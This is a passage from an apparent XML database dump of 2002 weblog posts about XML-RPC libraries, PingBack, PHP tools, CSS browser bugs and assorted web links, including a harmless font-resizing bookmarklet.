		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.oreillynet.com/pub/a/webservices/2002/01/18/brewster.html&quot;&gt;How the Wayback Machine Works&lt;/a&gt; is a must read for anyone geeky enough to be interested in cheap clustered databases on a huge scale. The interview includes some fascinating details on the cost effectiveness of Linux clusters:&lt;/p&gt;&lt;blockquote cite=&quot;http://www.oreillynet.com/pub/a/webservices/2002/01/18/brewster.html&quot;&gt;&lt;p&gt;What's amazing to me is the fact that the hardware is free. For doing things even in the hundreds of terabytes, it costs in the hundreds of thousands of dollars. When you talk to most people in IT departments, they spend a couple hundred thousand dollars just on a CPU, much less a terabyte of disk storage. You buy from EMC a terabyte for maybe $300,000. That's just the storage for 1 TB. We can buy 100 TBs with 250 CPUs to work on it, all on a high-speed switch with redundancy built in.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-08-31 14:20:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">352</field>
		<field name="title">ICANN schmicann</field>
		<field name="slug">icannSchmicann</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.aaronsw.com/weblog/000519&quot;&gt;IMS/ISC out of the ICANN Running&lt;/a&gt;, apparently because their proposal didn't include enough block diagrams. ICANNWatch have some great &lt;a href=&quot;http://www.icannwatch.org/article.php?sid=904&quot; title=&quot;ICANN to Give .org to ISOC: Insiders Win Again?&quot;&gt;conspiracy theories&lt;/a&gt; as to the real reason.&lt;/p&gt;</field>
		<field name="created">2002-08-31 14:25:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">353</field>
		<field name="title">PHP generated PDFs</field>
		<field name="slug">phpGeneratedPdfs</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://ros.co.nz/pdf/&quot;&gt;R&amp;amp;OS PDF PHP classes&lt;/a&gt; (via &lt;a href=&quot;http://tidakada.com/archives/m/200208#look_ma__my_first_PDF_blog__&quot; title=&quot;look ma, my first PDF blog !&quot;&gt;tidak ada&lt;/a&gt;). This is the most useful &lt;acronym title=&quot;PHP: Hypertext Pre-processor&quot;&gt;PHP&lt;/acronym&gt; library I've seen in a long time. It allows dynamic generation of &lt;acronym title=&quot;Portable Document Format&quot;&gt;PDF&lt;/acronym&gt; files without needing any additional modules installed on the server (although GD is required if you want to add images to your PDFs). It is extremely easy to use and has an impressive set of features, including PDF drawing tools, built in page number support and excellent documentation. On the topic of PDFs, &lt;a href=&quot;http://www.unixreview.com/documents/s=7459/uni1029856352811/&quot;&gt;Yes You Can&lt;/a&gt; advocates their use for presentations and touches on a method of generating them using Python.&lt;/p&gt;</field>
		<field name="created">2002-08-31 14:33:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">354</field>
		<field name="title">Semantic web 1-2-3</field>
		<field name="slug">semanticWeb123</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.disobey.com/detergent/2002/sw123/&quot;&gt;The Semantic Web: 1-2-3&lt;/a&gt; is an invaluable collection of links to semantic web resources, compiled by Morbus Iff. Morbis is the author of &lt;a href=&quot;http://www.disobey.com/amphetadesk/&quot;&gt;Amphetadesk&lt;/a&gt;, an excellent news aggregator which was &lt;a href=&quot;http://www.guardian.co.uk/online/story/0,3605,781838,00.html&quot; title=&quot;Working the web: Newsreaders&quot;&gt;reviewed favourably&lt;/a&gt; by Ben Hammersley in the Gaurdian just the other day.&lt;/p&gt;</field>
		<field name="created">2002-08-31 14:41:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">355</field>
		<field name="title">Vim guide</field>
		<field name="slug">vimGuide</field>
		<field name="body">&lt;p&gt;Free book: &lt;a href=&quot;http://www.newriders.com/books/opl/ebooks/0735710015.html&quot;&gt;Vi IMproved&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-08-31 15:41:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">356</field>
		<field name="title">File naming conventions</field>
		<field name="slug">fileNamingConventions</field>
		<field name="body">&lt;p&gt;What Do I Know is hosting an interesting discussion on &lt;a href=&quot;http://www.whatdoiknow.org/archives/000469.shtml#000469&quot;&gt;File Naming and Organization Methods&lt;/a&gt; for helping manage web development clients.&lt;/p&gt;</field>
		<field name="created">2002-08-31 15:43:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">357</field>
		<field name="title">30 days to becoming an Opera Lover</field>
		<field name="slug">timLuomaOnOpera</field>
		<field name="body">&lt;p&gt;Tim Luoma: &lt;a href=&quot;http://www.tntluoma.com/opera/lover/&quot;&gt;30 Days to becoming an Opera Lover&lt;/a&gt;. Advocacy doesn't get much more serious than this :) The series has reached day 5 and so far Tim has covered reasons you should try Opera, how to install it and touched on customisation. I've been meaning to write a Mozilla advocacy/tutorial piece for some time now and I am sorely tempted to steal Tim's format (which he himself &lt;a href=&quot;http://diveintoaccessibility.org/&quot; title=&quot;Dive Into Accessibility&quot;&gt;borrowed&lt;/a&gt; from Mark Pilgrim).&lt;/p&gt;</field>
		<field name="created">2002-08-31 21:29:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">358</field>
		<field name="title">A better trackback</field>
		<field name="slug">aBetterTrackback</field>
		<field name="body">&lt;p&gt;A discussion on Aquarionics &lt;a href=&quot;http://www.aquarionics.com/index.php?id=678&quot; title=&quot;Trackback&quot;&gt;nails&lt;/a&gt; why TrackBack isn't quite there yet (emphasis mine):&lt;/p&gt;&lt;blockquote cite=&quot;http://www.aquarionics.com/index.php?id=678&quot;&gt;&lt;p&gt;Plus, to support Trackback, I must put what amounts to part of an RSS feed in each post so that Movable Type's Bookmarklet thing can magically know what to do. I don't object to the idea as much as... &lt;strong&gt;well, there has to be a better way of doing this&lt;/strong&gt;.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;In the comments attached to the entry Stuart links to &lt;a href=&quot;http://www.kryogenix.org/days/000138.cas&quot; title=&quot;Making TrackBack happen automatically&quot;&gt;his thoughts&lt;/a&gt; on a better way of implementing the same functionality, using an XMLRPC server that can be auto-discovered via a &amp;lt;link&amp;gt; element.&lt;/p&gt;</field>
		<field name="created">2002-09-01 11:33:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">359</field>
		<field name="title">Font size bookmarklet</field>
		<field name="slug">fontSizeBookmarklet</field>
		<field name="body">&lt;p&gt;Scott Johnson (and &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/08/19.html#a466&quot; title=&quot;And I guess I&amp;apos;m not the Only One Bothered by Font Sizes&quot;&gt;others&lt;/a&gt;) has been waging war against &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/08/31.html#a513&quot; title=&quot;FontBitch, Defined.&quot;&gt;Font Bitches&lt;/a&gt;, aka people who use fixed (pixel) fonts on their sites making the text unresizable in Internet Explorer. Here's a new bookmarklet that can help alleviate the problem:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;javascript:function r(o) { if(o.style) {o.style.fontSize = &amp;apos;small&amp;apos;; o.style.lineHeight=&amp;apos;1.2em&amp;apos;;}var cn=o.childNodes,i; for (i=0;i&amp;lt;cn.length;++i) r(cn[i]); } r(document.body);&quot;&gt;Make fixed fonts resizable in IE&lt;/a&gt; (drag it on to your links bar and use it on any offending pages, then resize text with ctrl+mouse wheel).&lt;/p&gt;</field>
		<field name="created">2002-09-01 12:10:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">360</field>
		<field name="title">Joel on platforms</field>
		<field name="slug">joelOnPlatforms</field>
		<field name="body">&lt;p&gt;Joel Spolsky: &lt;a href=&quot;http://www.joelonsoftware.com/articles/Platforms.html&quot; title=&quot;Joel on Software - Platforms&quot;&gt;Platforms&lt;/a&gt;. Plenty of food for thought. Dave Winer &lt;a href=&quot;http://scriptingnews.userland.com/backissues/2002/08/31#When:7:59:09PM&quot; title=&quot;To Joel...&quot;&gt;responds&lt;/a&gt; with a pointer to his 1996 article &lt;a href=&quot;http://davenet.userland.com/1996/04/09/theperfectparent&quot;&gt;The Perfect Parent&lt;/a&gt; which touches on the reasons Groove can't count on making it as a platform.&lt;/p&gt;</field>
		<field name="created">2002-09-01 12:44:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">361</field>
		<field name="title">Templating with Smarty</field>
		<field name="slug">templatingWithSmarty</field>
		<field name="body">&lt;p&gt;Zend have a short tutorial on &lt;a href=&quot;http://www.zend.com/zend/tut/tutorial-cezar.php&quot;&gt;PHP Templating with Smarty&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-09-01 14:18:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">362</field>
		<field name="title">PHP XML-RPC</field>
		<field name="slug">phpXmlRpc</field>
		<field name="body">&lt;p&gt;I've been playing with XML-RPC and PHP today. I ended up using Keith Devin's pleasantly straight forward &lt;a href=&quot;http://www.keithdevens.com/software/xmlrpc/&quot; title=&quot;XML-RPC Client/Server (version 2.2.1)&quot;&gt;library&lt;/a&gt; thanks to PHP's &lt;a href=&quot;http://www.php.net/manual/en/ref.xmlrpc.php&quot; title=&quot;PHP: XML-RPC functions&quot;&gt;built in&lt;/a&gt; (and completely undocumented) XML-RPC support conflicting with the function names used by Useful Inc's &lt;a href=&quot;http://xmlrpc.usefulinc.com/php.html&quot; title=&quot;An XML-RPC client and server for PHP&quot;&gt;partially object oriented&lt;/a&gt; library. I've been messing around with Stuart's idea for a &lt;a href=&quot;http://www.kryogenix.org/days/000138.cas&quot;&gt;trackback alternative&lt;/a&gt; and things are looking pretty promising.&lt;/p&gt;</field>
		<field name="created">2002-09-01 20:41:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">363</field>
		<field name="title">Grabbing web pages with Perl and PHP</field>
		<field name="slug">grabbingWebPagesWithPerlAndPHP</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.perl.com/pub/a/2002/08/20/perlandlwp.html&quot;&gt;Web Basics with LWP&lt;/a&gt; (via &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/09/01.html#a520&quot; title=&quot;Perl and LWP Tutorial&quot;&gt;Scott&lt;/a&gt;) is an excellent tutorial on Perl's &lt;acronym title=&quot;Library for WWW in Perl&quot;&gt;LWP&lt;/acronym&gt;, a powerful set of modules which make it easy to retrieve content from the web. I've been using the excellent &lt;a href=&quot;http://snoopy.sourceforge.net/&quot;&gt;Snoopy&lt;/a&gt; class for PHP for the same purpose, but I have to admit it isn't half as comprehensive as LWP. I've also written my own simple function &lt;a href=&quot;/~cs1spw/software/php/safeget.php.txt&quot;&gt;safeGet&lt;/a&gt; for more light weight tasks - it grabs and returns the contents of a web page but limits both the size of the page and the maximum time it can take to download it.&lt;/p&gt;</field>
		<field name="created">2002-09-01 21:25:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">364</field>
		<field name="title">Yay for &amp;lt;links&amp;gt;</field>
		<field name="slug">yayLINKs</field>
		<field name="body">&lt;p&gt;Aquarionics has &lt;a href=&quot;http://www.aquarionics.com/index.php?id=680&quot; title=&quot;Safe Sections&quot;&gt;joined&lt;/a&gt; the Mozilla &amp;lt;link&amp;gt; element party.&lt;/p&gt;</field>
		<field name="created">2002-09-01 21:29:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">365</field>
		<field name="title">A new XML-RPC library for PHP</field>
		<field name="slug">aNewXMLRPCLibraryForPHP</field>
		<field name="body">&lt;p&gt;I spent most of yesterday messing around with XML-RPC. There are a variety of XMl-RPC libraries available for PHP but none of them felt right for what I needed. So, I've written my own.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot;&gt;The Incutio XML-RPC Library for PHP&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It's straight forward to use and does a pretty good job of hiding the details of the XML-RPC implementation from the user (by converting PHP types to XML-RPC types and back again transparently). There's very little documentation at the moment but I plan to write some shortly - in the mean time the example code should be enough for adventurous users.&lt;/p&gt;

&lt;p&gt;Feedback (bug reports in particular) can be sent via my &lt;a href=&quot;/~cs1spw/blog/contact/?subject=XMLRPC+library+feedback&quot;&gt;contact page&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-09-02 13:05:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">366</field>
		<field name="title">Testing pingback</field>
		<field name="slug">testingPingback</field>
		<field name="body">&lt;p&gt;Testing &lt;a href=&quot;http://www.kryogenix.org/days/000239.cas#000239&quot;&gt;pingback&lt;/a&gt;. This post is a lot more exciting than it looks ;)&lt;/p&gt; </field>
		<field name="created">2002-09-02 13:12:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">367</field>
		<field name="title">Pingback implemented</field>
		<field name="slug">pingBackImplemented</field>
		<field name="body">&lt;p&gt;I've implemented PingBack on my blog. PingBack is a system for tracking who is linking to your blog in a controlled way, based on a &lt;a href=&quot;http://www.kryogenix.org/days/000138.cas&quot; title=&quot;Making TrackBack happen automatically&quot;&gt;post by Stuart&lt;/a&gt; a few months ago. The idea is that when you link to a PingBack enabled blog you (or your blogging tool) should send an XML-RPC &quot;ping&quot; to that blog's PingBack server telling it where you have linked to and where you linked from. The PingBack server can then grab your page, check that the link is there and extract a title and short description from the blog. The system is an alternative to (and was inspired by) MoveableType's &lt;a href=&quot;http://www.moveabletype.org/trackback/&quot;&gt;TrackBack&lt;/a&gt; feature. Stuart and I are actively developing the idea and will be releasing code and documentation to help other people experiment with the system in the near future.&lt;/p&gt;</field>
		<field name="created">2002-09-02 15:18:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">368</field>
		<field name="title">More on Pingback</field>
		<field name="slug">moreOnPingBack</field>
		<field name="body">&lt;p&gt;More on PingBack. PingBack can be seen in effect &lt;a href=&quot;#pingBackImplemented&quot;&gt;on this blog&lt;/a&gt; and in &lt;a href=&quot;http://www.kryogenix.org/days/000239.cas#000239&quot;&gt;this entry&lt;/a&gt; on kryogenix.org. If you wish to ping my blog you can do so using the following XML-RPC details:&lt;/p&gt;&lt;pre&gt;Server: www.bath.ac.uk
Path: /~cs1spw/blog/pingback/server.php
Method: pingback.ping(pageLinkedFrom, pageLinkedTo)&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;pageLinkedFrom&lt;/code&gt; &lt;em&gt;must&lt;/em&gt; be the URL to a permalink archive page on my blog (complete with #fragment) and &lt;code&gt;pageLinkedTo&lt;/code&gt; &lt;em&gt;must&lt;/em&gt; be the URL of a page that contains a link to &lt;code&gt;pageLinkedFrom&lt;/code&gt;. My server is a bit flaky at the moment (hosting problems again) so you may need to repeat the ping a few times before it gets accepted. Stuart's PingBack server can be found at &lt;code&gt;http://www.kryogenix.org/mt/mt-xmlrpc.cgi&lt;/code&gt;. Both of our blogs now include a link element pointing to our PingBack servers, with the rel attribute set to &quot;pingback&quot; and the href attribute indicating the server URL. The link elements should enable auto-discovery of PingBack servers in the future (an idea based on Mark Pilgrim's &lt;a href=&quot;http://diveintomark.org/archives/2002/05/31.html#more_on_rss_autodiscovery&quot;&gt;RSS auto-discovery&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-09-02 15:33:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">369</field>
		<field name="title">Useful XML-RPC links</field>
		<field name="slug">usefulXmlRpcLinks</field>
		<field name="body">&lt;p&gt;Some useful XML-RPC links (before I forget):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.xmlrpc.com/spec&quot;&gt;The XML-RPC Specification&lt;/a&gt; - concise and readable.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://validator.xmlrpc.com/&quot;&gt;The XML-RPC Validator&lt;/a&gt; - a useful validation suite to ensure your XML-RPC implementation is up to scratch. &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot; title=&quot;The Incutio XML-RPC Library for PHP&quot;&gt;Mine&lt;/a&gt; currently fails two of the tests listed, so there's definitely room for improvement.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.onlamp.com/pub/a/python/2000/11/22/xmlrpcclient.html&quot;&gt;O'Reilly's invaluable Python XML-RPC tutorial&lt;/a&gt;. The Python interactive interpreter (with Python's xmlrpclib module) remains my preferred way of testing and debugging XML-RPC servers.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2002-09-02 15:48:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">370</field>
		<field name="title">And then there were eight</field>
		<field name="slug">andThenThereWere8</field>
		<field name="body">&lt;p&gt;According to XML-RPC.com's &lt;a href=&quot;http://www.xmlrpc.com/directory/1568/implementations&quot;&gt;Implementations page&lt;/a&gt; there are now 8 PHP implementations of XML-RPC! Looks like I wasn't the only person with an itch to scratch :)&lt;/p&gt;</field>
		<field name="created">2002-09-02 18:56:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">371</field>
		<field name="title">Feedback</field>
		<field name="slug">feedback</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=74796&quot;&gt;HarryF&lt;/a&gt; provided some excellent feedback on my library:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;...If I can dare to make one suggestion: would be good to seperate the HTTP client as a seperate object from the XML-RPC client.&lt;/p&gt;

&lt;p&gt;There's a good HTTP client class &lt;a href=&quot;http://www.phpclasses.org/browse.html/package/3.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The client still needs one or two things, namely SSL connections (using Curl perhaps or with PHP 4.3 fsockopen can access SSL sites if OpenSSL is compiled with PHP) and HTTP Basic Authentication.&lt;/p&gt;

&lt;p&gt;Also on the server side, would be great if there was a mechanism build in HTTP Authentication headers (again as a seperate class) - there's an Authentication class &lt;a href=&quot;http://sourceforge.net/projects/httpauthplus/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The reason is there's not a single XML-RPC class yet that handles HTTP fully. There's hardly even a complete PHP HTTP client to work with either.&lt;/p&gt;

&lt;p&gt;May be the ISO8601 types can be spotted in the strtotime() function?&lt;/p&gt;

&lt;p&gt;Also system.multicall would be good, as an in built mechanism (&lt;a href=&quot;http://www.xmlrpc.com/discuss/msgReader$1208&quot;&gt;see here&lt;/a&gt;) and a means to build in introspection automatically.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-09-02 21:53:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">372</field>
		<field name="title">Two Towers not available</field>
		<field name="slug">twoTowersNotAvailable</field>
		<field name="body">&lt;p&gt;Matt Drudge: &lt;a href=&quot;http://www.drudgereport.com/rings.htm&quot;&gt;The Two Towers is available on the Internet&lt;/a&gt;. Dorothea Salo: &lt;a href=&quot;http://www.yarinareth.net/caveatlector/archive/week_2002_09_01.html#e000907&quot;&gt;This is bogus&lt;/a&gt;. Aren't rumours fun?&lt;/p&gt;</field>
		<field name="created">2002-09-02 22:01:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">373</field>
		<field name="title">JellyBath</field>
		<field name="slug">jellyBath</field>
		<field name="body">&lt;p&gt;JellyBath (via &lt;a href=&quot;http://www.aquarionics.com/index.php?id=689&quot;&gt;Aquarionics&lt;/a&gt;). It turns your bath water in to Jelly. From the &lt;a href=&quot;http://www.jellybath.com/frame_faq.htm&quot;&gt;FAQ&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;&lt;strong&gt;Q.&lt;/strong&gt; Can I use Jellybath in a Jacuzzi or Hot Tub?&lt;br /&gt;
&lt;strong&gt;A.&lt;/strong&gt;  No, it is not recommended that you use Jellybath in tubs with jets.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Incidentally, Aquarion has &lt;a href=&quot;http://www.aquarionics.com/index.php?id=687&quot;&gt;implemented PingBack&lt;/a&gt; using my XML-RPC library. &lt;em&gt;Ping!&lt;/em&gt;&lt;/p&gt;</field>
		<field name="created">2002-09-02 22:12:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">374</field>
		<field name="title">The missing docs</field>
		<field name="slug">theMissingDocs</field>
		<field name="body">&lt;p&gt;Yet more XML-RPC goodness. The documentation for the suggested introspection methods throws a 404, but Google's cache doesn't:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://216.239.33.100/search?q=cache:EXJeZvGQ91EC:xmlrpc.usefulinc.com/doc/reserved.html+&amp;amp;hl=en&amp;amp;ie=UTF-8&quot;&gt;system.listMethods&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://216.239.33.100/search?q=cache:IBFFXSA1E7sC:xmlrpc.usefulinc.com/doc/sysmethodsig.html+&amp;amp;hl=en&amp;amp;ie=UTF-8&quot;&gt;system.methodSignature&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://216.239.33.100/search?q=cache:IzYzyVtWCdAC:xmlrpc.usefulinc.com/doc/sysmethhelp.html+&amp;amp;hl=en&amp;amp;ie=UTF-8&quot;&gt;system.methodHelp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://xmlrpc-c.sourceforge.net/xmlrpc-howto/xmlrpc-howto-api-introspection.html&quot;&gt;Introspection: Discovering Server APIs&lt;/a&gt; (thanks &lt;a href=&quot;http://swannieuk.blogspot.com/&quot;&gt;Mark&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I'll be adding these to my library as soon as I get a chance. Tonight though I'll be working on &lt;a href=&quot;http://scripts.incutio.com/directory/&quot;&gt;IncDirectory&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-09-02 22:23:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">375</field>
		<field name="title">Mime type list</field>
		<field name="slug">mimeTypeList</field>
		<field name="body">&lt;p&gt;A &lt;a href=&quot;ftp://ftp.isi.edu/in-notes/iana/assignments/media-types/media-types&quot; title=&quot;MEDIA TYPES&quot;&gt;comprehensive list&lt;/a&gt; of different MIME media types (via &lt;a href=&quot;http://scriptingnews.userland.com/backissues/2002/09/02#When:12:24:54PM&quot;&gt;Scripting News&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-09-02 23:46:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">376</field>
		<field name="title">Beta feeds from the Beeb</field>
		<field name="slug">betaFeedsFromTheBeeb</field>
		<field name="body">&lt;p&gt;The BBC are running a set of beta RSS feeds for their news service, covering the front page, World news, UK news and Technology news. The feeds provide the article title and the short sub-heading as a description. &lt;a href=&quot;http://www.blackbeltjones.com/work/mt/archives/000359.html&quot; title=&quot;Feed me, Auntie&quot;&gt;More information&lt;/a&gt; courtesy of Matt Jones.&lt;/p&gt;</field>
		<field name="created">2002-09-03 13:10:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">377</field>
		<field name="title">Even more XML-RPC</field>
		<field name="slug">evenMoreXmlRpc</field>
		<field name="body">&lt;p&gt;Yet more XML-RPC specs (thanks &lt;a href=&quot;http://www.pinkgoblin.com/&quot;&gt;HarryF&lt;/a&gt;):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://ontosys.com/xml-rpc/extensions.html&quot;&gt;&amp;lt;nil/&amp;gt; value&lt;/a&gt; (approved by Dave Winer &lt;a href=&quot;http://groups.yahoo.com/group/xml-rpc/message/340&quot; title=&quot;[xml-rpc] Re: XML-RPC Copyright and Disclaimer [DRAFT]&quot;&gt;here&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://xmlrpc-epi.sourceforge.net/specs/rfc.fault_codes.php&quot;&gt;Specification for Fault Code Interoperability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://groups.yahoo.com/group/xml-rpc/message/2897&quot;&gt;system.getCapabilities&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I've subscribed to the &lt;a href=&quot;http://groups.yahoo.com/group/xml-rpc&quot;&gt;XML-RPC mailing list&lt;/a&gt;. Finally, if you're still trying to get your head around XML-RPC you can't go wrong with HarryF's &lt;a href=&quot;http://www.webmasterbase.com/article/827&quot; title=&quot;Build your own Web Service with PHP and XML-RPC&quot;&gt;excellent tutorial&lt;/a&gt; on SitePoint.&lt;/p&gt;</field>
		<field name="created">2002-09-03 14:27:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">378</field>
		<field name="title">Short guide to digital photography</field>
		<field name="slug">shortGuideToDigitalPhotography</field>
		<field name="body">&lt;p&gt;Rob Tougher: &lt;a href=&quot;http://www.linuxgazette.com/issue82/tougher.html&quot;&gt;My Guide To Digital Photography&lt;/a&gt;. A short but informative article on using Linux and Python to manage a collection of digital photographs.&lt;/p&gt;</field>
		<field name="created">2002-09-03 14:30:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">379</field>
		<field name="title">Fixing IE6</field>
		<field name="slug">fixingIE6</field>
		<field name="body">&lt;p&gt;Jeffrey Zeldman on &lt;a href=&quot;http://www.zeldman.com/daily/0802d.html#csslayoutrevisited&quot; title=&quot;CSS Layout, Revisited&quot;&gt;fixing A List Apart&lt;/a&gt; for IE6:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.zeldman.com/daily/0802d.html#csslayoutrevisited&quot;&gt;
&lt;p&gt;MSIE6 has trouble calculating the heights of block level elements. Eddie Traversa discovered the browser was caching the values it calculated on one page of ALA and incorrectly applying those values to other pages of the site.&lt;/p&gt;

&lt;p&gt;Put simply, if the content area on page A was 200px high, and the same area on page B was 400px high, IE6 might display only the first 200px when it loaded page B. The initial value got stuck in the browser's cache. This is the reason that manually reloading (for instance, by hitting F11) &quot;fixed&quot; the bug on a page by page basis.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Jeffrey mentions a javascript fix for the problem which is now in use in &lt;a href=&quot;http://www.alistapart.com/tightmen.js&quot;&gt;ALA's global javascript&lt;/a&gt; file, and promises an article describing the fix in the near future.&lt;/p&gt;</field>
		<field name="created">2002-09-03 15:13:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">380</field>
		<field name="title">Top of the crops</field>
		<field name="slug">topOfTheCrops</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.kryogenix.org/days/000244.cas&quot; title=&quot;Cereal Killing&quot;&gt;Stuart&lt;/a&gt;: &lt;a href=&quot;http://www.circlemakers.org/totc2002.html&quot;&gt;Top of the Crops 2002&lt;/a&gt; - the highlights of the UK Crop Circle season. Some of these are just awe inspiring.&lt;/p&gt;</field>
		<field name="created">2002-09-03 16:30:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">381</field>
		<field name="title">The css-discuss Wiki</field>
		<field name="slug">theCssDiscussWiki</field>
		<field name="body">&lt;p&gt;The css-discuss Wiki has gone live - but only to list members. If you are on the list you will have received an email with instructions for accessing it. The Wiki should go live to non list members in a few days time.&lt;/p&gt;</field>
		<field name="created">2002-09-04 03:21:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">382</field>
		<field name="title">New IXR soon</field>
		<field name="slug">newIXRsoon</field>
		<field name="body">&lt;p&gt;I was up most of the night working on a new version of my XML-RPC library (newly named &lt;acronym title=&quot;Incutio XML-RPC&quot;&gt;IXR&lt;/acronym&gt;, for Incutio XML-RPC). I should have it ready for release some time today - it implements most of the extensions I've linked to over the past few days and has a much cleaner object structure than the first version, while maintaining the ability to implement a server or client in as little code as possible.&lt;/p&gt;

&lt;p&gt;While I was working with it I came up with an idea for a wyay of transferring objects over XML-RPC, which I've &lt;a href=&quot;http://groups.yahoo.com/group/xml-rpc/message/4840&quot;&gt;written up and posted&lt;/a&gt; to the XML-RPC mailing list. Take a look and tell me what you think :)&lt;/p&gt;</field>
		<field name="created">2002-09-04 12:05:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">383</field>
		<field name="title">Browser based rich text editing</field>
		<field name="slug">browserBasedRichTextEditing</field>
		<field name="body">&lt;p&gt;Scott &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/09/04.html#a535&quot;&gt;wants a rich text editor for Mozilla&lt;/a&gt;. What's more, he's willing to put his money where his mouth is and organise a fund drive to give developers a real incentive to do a good job.&lt;/p&gt;

&lt;p&gt;At &lt;a href=&quot;http://www.incutio.com/&quot;&gt;Incutio&lt;/a&gt; we have a long history of messing around with rich text editors. I wrote an IE DHTML editor (similar to the one used by Radio Userland) least year which is still in use in our flagship CMS. We are currently looking at replacing it with a Flash editor, which will give us both cross platform compatibility and a better level of control over the HTML. Put simply, MSHTML generated code is absolutely revolting. It's made worse by the fact that people can cut and paste from Word, Excel and even other IE windows, preserving the formatting every time. Great for picky users but a nightmare for us web developers who are trying to keep the visual look of a site constant. And you can forget about standards compliance...&lt;/p&gt;

&lt;p&gt;With CSS finally at a stage where we can properly start to separate structure from presentation I think WYSIWYG editors are far less relevant today than they were a year ago. XHTML is about semantic markup, with presentational stuff being relegated to the site developer controlled stylesheet (where it rightly belongs). Any page editing tools need to concentrate on helping users mark up content in a meaningful way rather than letting them chose their favourite colours and fonts.&lt;/p&gt;

